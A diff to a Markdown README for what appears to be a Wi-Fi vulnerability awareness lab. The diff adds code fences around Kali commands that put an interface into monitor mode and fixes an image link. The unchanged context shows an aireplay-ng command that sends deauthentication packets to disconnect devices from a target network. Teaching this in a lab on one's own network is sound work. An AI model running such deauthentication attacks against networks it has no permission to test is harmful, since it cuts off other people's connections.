@@ -42,11 +42,11 @@ To raise awareness about Wi-Fi network vulnerabilities by showing how attackers 
 
 ### ✅ Step 2: Enable Monitor Mode  
 Run the following commands in the Kali terminal:
-
+```bash
 sudo ip link set wlan0 down
 sudo iw dev wlan0 set type monitor
 sudo ip link set wlan0 up
-
+```
 ---
 
 ### ✅ Step 3: Scan Wi-Fi Networks  
@@ -69,7 +69,7 @@ sudo aireplay-ng --deauth 50 -a [Target_BSSID] wlan0
 - Replace `[Target_BSSID]` with your network's BSSID  
 - Sends 50 deauthentication packets to disconnect connected devices  
 
-<img src="https://imgur.com/MAYFtk7" height="80%" width="80%" alt="Attack Time"/>
+<img src="https://imgur.com/MAYFtk7.png" height="80%" width="80%" alt="Attack Time"/>
 
 ---
 
